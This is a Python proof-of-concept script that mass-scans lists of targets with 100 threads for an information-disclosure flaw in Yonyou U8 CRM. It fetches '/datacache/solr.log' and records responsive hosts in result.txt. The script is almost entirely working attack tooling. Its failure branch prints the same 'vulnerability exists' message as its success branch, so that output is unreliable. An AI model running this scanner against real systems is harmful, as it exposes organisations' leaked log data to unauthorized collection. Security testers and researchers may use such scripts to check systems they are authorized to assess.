import requests
import argparse
import sys
import pickle
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    parser = argparse.ArgumentParser(description="用友u8CRM 存在信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/datacache/solr.log'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    proxie = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=target, verify=False)
        if res.status_code == 200:
            response = requests.get(url=target+payload, headers=headers,proxies=proxie, verify=False,timeout=10)
            if response.status_code == 200 and 'field' in response.text:
                print(f"[+] 该网址存在信息泄露漏洞 {target}")
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f"[-] 该网址存在信息泄露漏洞 {target}")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()
